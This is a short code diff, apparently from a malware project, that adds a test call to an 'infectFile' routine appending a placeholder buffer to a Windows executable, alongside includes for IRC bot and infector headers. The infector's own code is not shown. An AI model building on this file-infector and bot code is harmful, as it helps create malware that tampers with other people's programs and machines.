@@ -1,7 +1,12 @@
+#include "config.h"
+
 #include <stdio.h>
 #include <stdlib.h>
 
+#include "log.h"
 #include "irc.h"
+#include "infector.h"
+
 
 int main(int argc, char * argv[])
 {
@@ -16,6 +21,12 @@ int main(int argc, char * argv[])
       botLoop();
     */
 
+    #define TESTSTR "AAAA"
+    if (infectFile(TESTSTR, 4, "C:\\Users\\null\\Documents\\calc.exe") != ERR_OK) {
+        D2("appendBuf2Bin failed.\n");
+    }
+
+    D2("done.\n");
     getchar();
     return 0;
 }
